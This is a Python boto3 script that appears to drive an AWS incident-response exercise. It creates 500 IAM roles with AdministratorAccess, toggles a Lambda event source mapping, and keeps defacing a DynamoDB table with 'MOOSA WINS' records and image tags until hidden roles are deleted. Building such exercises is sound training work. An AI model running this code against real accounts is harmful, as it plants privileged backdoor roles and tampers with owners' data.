import boto3, json, random, string
from time import sleep

def generateRando():
    rando = ''.join(random.choices(string.ascii_letters + string.digits + '+=,.@-_', k=59))
    return rando

def getRoleCreds(role, name):
    stsClient = boto3.client('sts')

    credentials = stsClient.assume_role(
        RoleArn=role,
        RoleSessionName = name
    )['Credentials']

    return credentials

def setup(iamClient, lambdaClient, eventSource):
    back = "Everybody, yeah Rock your body, yeah Everybody, yeah Rock your body right Backstreets back, alright Hey, yeah, oh Oh my God, were back again Brothers, sisters, everybody sing Gonna bring the flavor, show you how Got a question for you, better answer now, yeah Am I original MOOSA WINS"
    assumeDoc = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "sts:AssumeRole",
                    "Principal": { "AWS": f"arn:aws:iam::{boto3.client('sts').get_caller_identity().get('Account')}:root" }
                }
            ]
        }
    roles = []

    eventUpdate = lambdaClient.update_event_source_mapping(UUID=eventSource['UUID'], Enabled=False)
    print(f"{eventUpdate['UUID']} State: {eventUpdate['State']}")
    
    print("Generating 500 IAM Roles")
    for _ in range(500):
        roleName = f"{generateRando()}MOOSA"
        iamClient.create_role(
            RoleName = roleName,
            AssumeRolePolicyDocument = json.dumps(assumeDoc),
            Description = back
        )

        iamClient.attach_role_policy(
            RoleName = roleName,
            PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess'
        )

        roles.append(roleName)
    
    return roles

def phaseOne(iamClient, role):
    print("Starting Phase 1")
    roleArn = iamClient.get_role(RoleName = role)['Role']['Arn']
    phaseRole = getRoleCreds(roleArn, 'phaseOne')
    print(f"Role: {roleArn}")
    
    phaseOneTable = [
        {"avg_score": {"S": "<img src=\"images/parrot.gif\">"},"games": {"S": "<img src=\"images/parrot.gif\">"},"player": {"S": "<img src=\"images/dealwithit.gif\">"},"win_percent": {"S": "<img src=\"images/dealwithit.gif\">"},"wins": {"S": "<img src=\"images/parrot.gif\">"}},
        {"avg_score": {"S": "<img src=\"images/parrot.gif\">"},"games": {"S": "<img src=\"images/parrot.gif\">"},"player": {"S": "<img src=\"images/parrot.gif\">"},"win_percent": {"S": "<img src=\"images/parrot.gif\">"},"wins": {"S": "<img src=\"images/parrot.gif\">"}},
        {"avg_score": {"S": "WINS"},"games": {"S": "MOOSA WINS"},"player": {"S": "MOOSA"},"win_percent": {"S": "WINS"},"wins": {"S": "MOOSA"}}
    ]

    p1 = True
    ddbClientp1 = boto3.client(
        'dynamodb', 
        aws_access_key_id = phaseRole['AccessKeyId'],
        aws_secret_access_key = phaseRole['SecretAccessKey'],
        aws_session_token = phaseRole['SessionToken']
    )
    
    def scanTaTourneyStats():
        return ddbClientp1.scan(TableName = 'TaTourneyStats', ProjectionExpression='player')['Items']
    
    def resetTable():
        items = scanTaTourneyStats()
        if len(items) > 0:
            for value in items:
                ddbClientp1.delete_item(TableName = 'TaTourneyStats', Key = value)
        
        batchItems = []
        for record in phaseOneTable:
            RequestItem = {
                "PutRequest": {
                    "Item": record
                }
            }

            batchItems.append(RequestItem)
        
        ddbClientp1.batch_write_item(
            RequestItems={
                'TaTourneyStats': batchItems
            }
        )
    
    acceptablePlayer = ["<img src=\"images/dealwithit.gif\">", "<img src=\"images/parrot.gif\">", "MOOSA"]
    while p1:

        try:
            iamClient.get_role(RoleName = role)
        except Exception as e:
            print(e)
            p1 = False
            
        ddbClientp1.list_tables()
        taTourneyStats = scanTaTourneyStats()
        for i in taTourneyStats:
            if i['player']['S'] not in acceptablePlayer:
                resetTable()
                break
        sleep(10)

def phaseTwo(iamClient, lambdaClient, role, eventSource):
    print("Starting Phase 2")

    roleArn = iamClient.get_role(RoleName = role)['Role']['Arn']
    phaseRole = getRoleCreds(roleArn, 'phaseTwo')    
    print(f"Role: {roleArn}")
    
    phaseTwoRecord = {"avg_score": {"N": "1000000"}, "games": {"N": "9001"}, "player": {"S": "Moosa"}, "win_percent": {"S": "1000000%"}, "wins": {"N": "9001"}}

    p2 = True
    ddbClientp2 = boto3.client(
        'dynamodb', 
        aws_access_key_id = phaseRole['AccessKeyId'],
        aws_secret_access_key = phaseRole['SecretAccessKey'],
        aws_session_token = phaseRole['SessionToken']
    )
 
    eventUpdate = lambdaClient.update_event_source_mapping(UUID=eventSource['UUID'], Enabled=True)
    print(f"Phase Two! {eventUpdate['UUID']} State: {eventUpdate['State']}")

    while p2:
        try:
            iamClient.get_role(RoleName = role)
        except Exception as e:
            print(e)
            p2 = False

        ddbClientp2.describe_table(TableName = 'TaTourney')
        ddbClientp2.put_item(
            TableName = 'TaTourneyStats',
            Item = phaseTwoRecord
        )

        sleep(1)

def phaseThree(iamClient, lambdaClient, role, eventSource):
    print("Starting Phase 3")
    roleArn = iamClient.get_role(RoleName = role)['Role']['Arn']
    phaseRole = getRoleCreds(roleArn, 'phaseThree')
    print(f"Role: {roleArn}")

    phaseThreeTable = [
        {"avg_score": {"S": "<img src=\"images/parrot.gif\">"},"games": {"S": "<img src=\"images/parrot.gif\">"},"player": {"S": "<img src=\"images/moosajailbird.gif\">"},"win_percent": {"S": "<img src=\"images/moosajailbird.gif\">"},"wins": {"S": "<img src=\"images/parrot.gif\">"}},
        {"avg_score": {"S": "<img src=\"images/parrot.gif\">"},"games": {"S": "<img src=\"images/parrot.gif\">"},"player": {"S": "<img src=\"images/parrot.gif\">"},"win_percent": {"S": "<img src=\"images/parrot.gif\">"},"wins": {"S": "<img src=\"images/parrot.gif\">"}},
        {"avg_score": {"S": "WINS"},"games": {"S": "MOOSA WINS"},"player": {"S": "MOOSA"},"win_percent": {"S": "WINS"},"wins": {"S": "MOOSA"}}
    ]

    p3 = True
    ddbClientp3 = boto3.client(
        'dynamodb', 
        aws_access_key_id = phaseRole['AccessKeyId'],
        aws_secret_access_key = phaseRole['SecretAccessKey'],
        aws_session_token = phaseRole['SessionToken']
    )

    eventUpdate = lambdaClient.update_event_source_mapping(UUID=eventSource['UUID'], Enabled=False)
    print(f"Phase Three! {eventUpdate['UUID']} State: {eventUpdate['State']}")

    def scanTaTourneyStats():
        return ddbClientp3.scan(TableName = 'TaTourneyStats', ProjectionExpression='player')['Items']
    
    def resetTable():
        items = scanTaTourneyStats()
        if len(items) > 0:
            for value in items:
                ddbClientp3.delete_item(TableName = 'TaTourneyStats', Key = value)
        
        batchItems = []
        for record in phaseThreeTable:
            RequestItem = {
                "PutRequest": {
                    "Item": record
                }
            }

            batchItems.append(RequestItem)
        
        ddbClientp3.batch_write_item(
            RequestItems={
                'TaTourneyStats': batchItems
            }
        )
    
    acceptablePlayer = ["<img src=\"images/moosajailbird.gif\">", "<img src=\"images/parrot.gif\">", "MOOSA"]
    while p3:   
        try:
            iamClient.get_role(RoleName = role)
        except Exception as e:
            print(e)
            p3 = False

        ddbClientp3.describe_limits()
        taTourneyStats = scanTaTourneyStats()
        for i in taTourneyStats:
            if i['player']['S'] not in acceptablePlayer:
                resetTable()
                break
        sleep(10)

def End(ddbClient, lambdaClient, eventSource):
    print("User won... cleaning up after myself")

    def scanTaTourneyStats():
        return ddbClient.scan(TableName = 'TaTourneyStats', ProjectionExpression='player')['Items']
    
    def resetTable():
        items = scanTaTourneyStats()
        if len(items) > 0:
            for value in items:
                ddbClient.delete_item(TableName = 'TaTourneyStats', Key = value)

    resetTable()

    lambdaClient.delete_event_source_mapping(UUID = eventSource['UUID'])
    lambdaClient.create_event_source_mapping(
        EventSourceArn = eventSource['EventSourceArn'],
        FunctionName = eventSource['FunctionArn'],
        Enabled = True,
        BatchSize = 2,
        StartingPosition = 'TRIM_HORIZON'
    )

def main():
    iamClient = boto3.client('iam')
    lambdaClient = boto3.client('lambda')
    ddbClient = boto3.client('dynamodb')

    functions = lambdaClient.list_functions(FunctionVersion = "ALL")['Functions']
    targetFunc = ''
    for function in functions:
        if 'Stream' in function['FunctionName']:
            targetFunc = function['FunctionArn'].split('$')[0][:-1]
    
    print(targetFunc)
    eventSourceMappings = lambdaClient.list_event_source_mappings(FunctionName = targetFunc)['EventSourceMappings']
    print(eventSourceMappings)
    if len(eventSourceMappings) < 1:
        return
    else:
        eventSource = eventSourceMappings[0]

    # Phases
    roles = setup(iamClient, lambdaClient, eventSource)
    p1roleIndex = random.randint(100,201)
    phaseOne(iamClient, roles[p1roleIndex])
    items = ddbClient.scan(TableName = 'TaTourneyStats', ProjectionExpression='player')['Items']
    if len(items) > 0:
        for value in items:
            ddbClient.delete_item(TableName = 'TaTourneyStats', Key = value)

    p2roleIndex = random.randint(200,301)
    phaseTwo(iamClient, lambdaClient, roles[p2roleIndex], eventSource)

    p3roleIndex = random.randint(300,401)
    phaseThree(iamClient, lambdaClient, roles[p3roleIndex], eventSource)

    End(ddbClient, lambdaClient, eventSource)


if __name__ == '__main__':
    main()